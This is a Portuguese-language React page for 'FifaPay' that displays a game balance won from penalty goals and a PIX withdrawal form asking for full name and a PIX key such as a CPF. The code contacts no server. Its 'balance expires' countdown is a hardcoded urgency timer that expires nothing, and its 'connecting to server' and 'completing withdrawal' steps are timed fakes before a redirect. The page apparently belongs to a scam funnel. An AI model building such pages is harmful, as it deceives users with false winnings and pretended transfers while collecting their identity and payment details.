import { useEffect, useMemo, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Wallet, CreditCard, X, ChevronDown } from "lucide-react";
import logo from "@/assets/fifapay-logo.png";
import coin from "@/assets/coin-p.png";
import pixLogo from "@/assets/pix-logo.svg";

const EXPIRES_SECONDS = 16 * 60 + 26; // 00:16:26

const formatBRL = (n: number) => n.toFixed(2).replace(".", ",");

const Resgate = () => {
  const navigate = useNavigate();
  const playerName = sessionStorage.getItem("fifapay:player") || "Jogador";
  const balance = useMemo(
    () => parseFloat(sessionStorage.getItem("fifapay:balance") || "0") || 0,
    []
  );
  const goals = useMemo(
    () => parseInt(sessionStorage.getItem("fifapay:goals") || "0", 10) || 0,
    []
  );
  const avgPerGoal = goals > 0 ? balance / goals : 0;

  const [secondsLeft, setSecondsLeft] = useState(EXPIRES_SECONDS);
  const [amount, setAmount] = useState(formatBRL(balance));

  // Modal de Saque PIX
  const [pixOpen, setPixOpen] = useState(false);
  const [fullName, setFullName] = useState("");
  const [pixType, setPixType] = useState<"" | "CPF" | "E-mail" | "Celular" | "Chave Aleatória">("");
  const [pixKey, setPixKey] = useState("");
  const [typeOpen, setTypeOpen] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  // Tela de carregamento (4 etapas)
  const LOADING_STEPS = [
    "Validando dados...",
    "Conectando ao servidor...",
    "Concluindo resgate...",
    "Quase pronto...",
  ];
  const [loadingStep, setLoadingStep] = useState<number | null>(null);

  useEffect(() => {
    const id = setInterval(() => setSecondsLeft((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(id);
  }, []);

  const hh = String(Math.floor(secondsLeft / 3600)).padStart(2, "0");
  const mm = String(Math.floor((secondsLeft % 3600) / 60)).padStart(2, "0");
  const ss = String(secondsLeft % 60).padStart(2, "0");

  const handleAmountChange = (v: string) => {
    // Permite apenas dígitos e vírgula
    const cleaned = v.replace(/[^\d,]/g, "");
    setAmount(cleaned);
  };

  const handleWithdraw = () => {
    sessionStorage.setItem("fifapay:withdraw", amount);
    setPixOpen(true);
    setSubmitted(false);
  };

  const closePix = () => {
    setPixOpen(false);
    setTypeOpen(false);
  };

  const confirmPix = () => {
    if (!fullName.trim() || !pixType || !pixKey.trim()) return;
    setPixOpen(false);
    setLoadingStep(0);
  };

  // Avança as etapas do loading e redireciona ao final
  useEffect(() => {
    if (loadingStep === null) return;
    if (loadingStep >= LOADING_STEPS.length) {
      // Salva os dados do saque para a tela de confirmação
      sessionStorage.setItem("fifapay:pixName", fullName.trim());
      sessionStorage.setItem("fifapay:pixType", pixType);
      sessionStorage.setItem("fifapay:pixKey", pixKey.trim());
      navigate("/confirmacao");
      return;
    }
    const t = setTimeout(() => setLoadingStep((s) => (s ?? 0) + 1), 1400);
    return () => clearTimeout(t);
  }, [loadingStep, fullName, pixType, pixKey, navigate]);

  const formatCPF = (v: string) => {
    const d = v.replace(/\D/g, "").slice(0, 11);
    return d
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
  };

  const placeholderByType: Record<string, string> = {
    CPF: "000.000.000-00",
    "E-mail": "voce@email.com",
    Celular: "(11) 99999-9999",
    "Chave Aleatória": "xxxx-xxxx-xxxx-xxxx",
  };

  return (
    <div className="min-h-dvh w-full bg-gradient-to-b from-emerald-950 via-emerald-900 to-emerald-950 text-white">
      <div className="mx-auto max-w-md px-5 pb-8 pt-3">
        {/* Timer de expiração */}
        <div className="mb-5 w-full overflow-hidden rounded-xl border border-yellow-400/35 bg-emerald-950/95 px-3 py-3 shadow-lg shadow-black/25">
          <div className="flex flex-col items-center justify-center gap-1.5 text-center sm:flex-row sm:flex-wrap sm:gap-x-2">
            <span className="text-[10px] font-bold uppercase tracking-wide text-yellow-200/95 sm:text-[11px]">
              Seu saldo expira em
            </span>
            <span className="font-mono text-base font-display font-bold tabular-nums tracking-wide text-yellow-300 sm:text-lg">
              {hh} - {mm} - {ss}
            </span>
          </div>
        </div>

        {/* Logo */}
        <div className="mb-5 flex justify-center">
          <img
            src={logo}
            alt="FifaPay"
            className="h-12 w-auto select-none object-contain drop-shadow-[0_6px_14px_rgba(250,204,21,0.25)]"
            draggable={false}
          />
        </div>

        <h1 className="mb-1 text-center text-lg font-display font-bold text-white">
          Resgatar recompensas
        </h1>
        <p className="mb-6 text-center text-sm text-emerald-200/80">Olá, {playerName}</p>

        {/* Card de saldo */}
        <div className="mb-4 mt-5 w-full">
          <div
            className="box-border w-full min-h-[117px] overflow-hidden rounded-[12px] bg-emerald-950 p-5 shadow-[0_1px_18.4px_rgba(0,0,0,0.12)]"
            style={{ borderBottom: "1px dashed rgba(6, 78, 59, 0.85)" }}
          >
            <div className="flex items-end justify-between gap-4">
              <div className="flex min-w-0 flex-1 flex-col gap-2">
                <div className="flex items-center gap-1">
                  <span className="text-[17px] font-medium leading-normal text-emerald-50">
                    Seu saldo
                  </span>
                </div>
                <div className="flex flex-col gap-2" aria-live="polite">
                  <span className="text-[30px] font-bold leading-none tracking-tight text-white tabular-nums">
                    R$ {formatBRL(balance)}
                  </span>
                </div>
              </div>
              <div className="flex shrink-0 items-end">
                <span className="inline-flex items-end">
                  <img
                    src={coin}
                    alt=""
                    aria-hidden="true"
                    className="h-[72px] w-[72px] max-h-[72px] object-contain object-bottom"
                    draggable={false}
                  />
                </span>
              </div>
            </div>
          </div>

          <div className="box-border mt-2 flex w-full flex-col items-start gap-2.5 overflow-hidden rounded-[10px] bg-emerald-950 px-5 py-2.5 shadow-[0_1px_18.4px_rgba(0,0,0,0.12)]">
            <div className="flex w-full flex-col gap-2" aria-live="polite">
              <span className="text-[13px] font-normal leading-normal text-emerald-500/90">
                Última recompensa:{" "}
                <span className="font-medium text-yellow-400/95">
                  R$ {formatBRL(balance)}
                </span>
              </span>
            </div>
          </div>
        </div>

        {/* Média por gol */}
        <div className="mb-4 rounded-2xl border border-emerald-700/45 bg-emerald-900/55 px-4 py-3 backdrop-blur-sm">
          <p className="text-xs font-medium text-emerald-200/85">
            Média por gol:{" "}
            <span className="font-bold text-yellow-300">R$ {formatBRL(avgPerGoal)}</span>
          </p>
        </div>

        {/* Sacar dinheiro */}
        <div className="rounded-2xl border border-emerald-700/40 bg-emerald-900/50 p-5 shadow-inner backdrop-blur-sm">
          <p className="mb-1 text-base font-display font-bold text-white">Sacar dinheiro</p>
          <p className="mb-5 flex flex-wrap items-center gap-1.5 text-xs font-medium text-emerald-200/70">
            <CreditCard className="h-4 w-4 opacity-90" />
            Transferência via /
            <img
              src={pixLogo}
              alt="PIX"
              className="ml-0.5 h-[14px] w-auto opacity-90 brightness-0 invert"
            />
          </p>

          <label className="mb-1.5 block text-xs font-bold text-emerald-200/90">
            Valor do saque (máx. R$ {formatBRL(balance)})
          </label>
          <div className="relative mb-3">
            <span className="absolute left-3 top-1/2 -translate-y-1/2 text-sm font-bold text-emerald-300/80">
              R$
            </span>
            <input
              type="text"
              inputMode="decimal"
              autoComplete="off"
              placeholder="0,00"
              value={amount}
              onChange={(e) => handleAmountChange(e.target.value)}
              className="w-full rounded-xl border border-emerald-700/60 bg-emerald-950/70 py-3 pl-10 pr-3 font-bold text-white placeholder:text-emerald-600/50 focus:border-yellow-400/50 focus:outline-none focus:ring-2 focus:ring-yellow-400/40"
            />
          </div>

          <button
            type="button"
            onClick={() => setAmount(formatBRL(balance))}
            className="mb-3 flex h-[50px] w-full items-center justify-center rounded-[6px] border-[1.5px] border-transparent bg-emerald-950/65 text-sm font-display font-bold text-emerald-100 transition-colors hover:border-emerald-600/50"
          >
            Valor total: R$ {formatBRL(balance)}
          </button>

          <div className="min-h-[18px]" />

          <button
            type="button"
            onClick={handleWithdraw}
            className="mt-2 flex h-12 w-full items-center justify-center gap-2 rounded-2xl text-sm font-display font-bold transition-all bg-gradient-to-r from-yellow-400 to-amber-400 text-emerald-950 shadow-lg shadow-yellow-500/25 hover:from-yellow-300 hover:to-amber-300 active:scale-[0.98]"
          >
            <Wallet className="h-5 w-5" strokeWidth={2.5} />
            Sacar dinheiro
          </button>
        </div>

        <button
          type="button"
          onClick={() => {
            // Reinicia a partida mantendo o jogador
            sessionStorage.removeItem("fifapay:balance");
            sessionStorage.removeItem("fifapay:goals");
            sessionStorage.removeItem("fifapay:withdraw");
            navigate("/penaltis");
          }}
          className="mt-6 w-full rounded-2xl border-2 border-emerald-600/50 bg-emerald-900/30 py-3.5 text-sm font-bold text-emerald-100 transition-all hover:bg-emerald-900/50 active:scale-[0.99]"
        >
          Jogar novamente
        </button>
      </div>

      {/* Modal Saque PIX */}
      {pixOpen && (
        <div
          className="fixed inset-0 z-50 flex items-end justify-center bg-black/70 backdrop-blur-sm sm:items-center"
          onClick={closePix}
        >
          <div
            className="w-full max-w-md rounded-t-2xl border border-emerald-700/50 bg-emerald-950 p-5 shadow-2xl sm:rounded-2xl"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Cabeçalho */}
            <div className="mb-4 flex items-start justify-between">
              <div>
                <p className="text-[11px] font-bold uppercase tracking-wider text-emerald-300/80">
                  Saque PIX
                </p>
                <p className="mt-1 text-base font-display font-bold text-white">
                  Valor: R$ {formatBRL(parseFloat(amount.replace(",", ".")) || 0)}
                </p>
              </div>
              <button
                type="button"
                onClick={closePix}
                aria-label="Fechar"
                className="rounded-full p-1 text-emerald-200/80 hover:bg-emerald-900/60 hover:text-white"
              >
                <X className="h-5 w-5" />
              </button>
            </div>

            {submitted ? (
              <div className="py-6 text-center">
                <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-yellow-400/20">
                  <Wallet className="h-7 w-7 text-yellow-300" />
                </div>
                <h3 className="mb-1 text-lg font-display font-bold text-white">
                  Solicitação enviada!
                </h3>
                <p className="text-sm text-emerald-200/80">
                  Em instantes você receberá o PIX de{" "}
                  <span className="font-bold text-yellow-300">
                    R$ {formatBRL(parseFloat(amount.replace(",", ".")) || 0)}
                  </span>{" "}
                  na chave informada.
                </p>
                <button
                  type="button"
                  onClick={closePix}
                  className="mt-5 w-full rounded-xl bg-gradient-to-r from-yellow-400 to-amber-400 py-3 text-sm font-display font-bold text-emerald-950"
                >
                  Concluir
                </button>
              </div>
            ) : (
              <>
                {/* Nome completo */}
                <label className="mb-1.5 block text-xs font-bold text-emerald-200/90">
                  Nome completo
                </label>
                <input
                  type="text"
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value.slice(0, 100))}
                  placeholder="Como no documento"
                  className="mb-4 w-full rounded-xl border border-emerald-700/60 bg-emerald-900/50 px-3 py-3 text-sm font-medium text-white placeholder:text-emerald-500/60 focus:border-yellow-400/50 focus:outline-none focus:ring-2 focus:ring-yellow-400/30"
                />

                {/* Tipo de chave PIX */}
                <label className="mb-1.5 block text-xs font-bold text-emerald-200/90">
                  Tipo de chave PIX
                </label>
                <button
                  type="button"
                  onClick={() => setTypeOpen((o) => !o)}
                  className="mb-2 flex w-full items-center justify-between rounded-xl border border-emerald-700/60 bg-emerald-900/50 px-3 py-3 text-left text-sm font-medium text-white"
                >
                  <span className={pixType ? "text-white" : "text-emerald-500/70"}>
                    {pixType || "Selecione o tipo"}
                  </span>
                  <ChevronDown
                    className={`h-4 w-4 text-emerald-300 transition-transform ${
                      typeOpen ? "rotate-180" : ""
                    }`}
                  />
                </button>

                {typeOpen && (
                  <div className="mb-3 overflow-hidden rounded-xl border border-emerald-700/60 bg-emerald-900/70">
                    {(["CPF", "E-mail", "Celular", "Chave Aleatória"] as const).map((t) => (
                      <button
                        key={t}
                        type="button"
                        onClick={() => {
                          setPixType(t);
                          setTypeOpen(false);
                          setPixKey("");
                        }}
                        className={`block w-full border-b border-emerald-800/60 px-4 py-3 text-left text-sm font-bold last:border-b-0 hover:bg-emerald-800/60 ${
                          pixType === t ? "text-yellow-300" : "text-white"
                        }`}
                      >
                        {t}
                      </button>
                    ))}
                  </div>
                )}

                {/* Chave PIX */}
                {pixType && (
                  <>
                    <label className="mb-1.5 block text-xs font-bold text-emerald-200/90">
                      Chave {pixType}
                    </label>
                    <input
                      type="text"
                      value={pixKey}
                      onChange={(e) => setPixKey(e.target.value.slice(0, 80))}
                      placeholder={placeholderByType[pixType]}
                      className="mb-4 w-full rounded-xl border border-emerald-700/60 bg-emerald-900/50 px-3 py-3 text-sm font-medium text-white placeholder:text-emerald-500/60 focus:border-yellow-400/50 focus:outline-none focus:ring-2 focus:ring-yellow-400/30"
                    />
                  </>
                )}

                <button
                  type="button"
                  onClick={confirmPix}
                  disabled={!fullName.trim() || !pixType || !pixKey.trim()}
                  className="mt-2 flex h-12 w-full items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-yellow-400 to-amber-400 text-sm font-display font-bold text-emerald-950 shadow-lg shadow-yellow-500/25 transition-all hover:from-yellow-300 hover:to-amber-300 active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-50"
                >
                  <Wallet className="h-5 w-5" strokeWidth={2.5} />
                  Confirmar saque
                </button>
              </>
            )}
          </div>
        </div>
      )}

      {/* Overlay de carregamento com etapas */}
      {loadingStep !== null && (
        <div className="fixed inset-0 z-[60] flex flex-col items-center justify-center bg-emerald-950/85 backdrop-blur-sm px-6">
          <div className="w-full max-w-sm">
            <div className="mb-5 h-2.5 w-full overflow-hidden rounded-full bg-emerald-900/70">
              <div
                className="h-full rounded-full bg-gradient-to-r from-yellow-400 to-amber-400 transition-all duration-700 ease-out"
                style={{
                  width: `${Math.min(((Math.min(loadingStep, LOADING_STEPS.length - 1) + 1) / LOADING_STEPS.length) * 100, 100)}%`,
                }}
              />
            </div>
            <p className="text-center text-base font-display font-bold text-white">
              {LOADING_STEPS[Math.min(loadingStep, LOADING_STEPS.length - 1)]}
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default Resgate;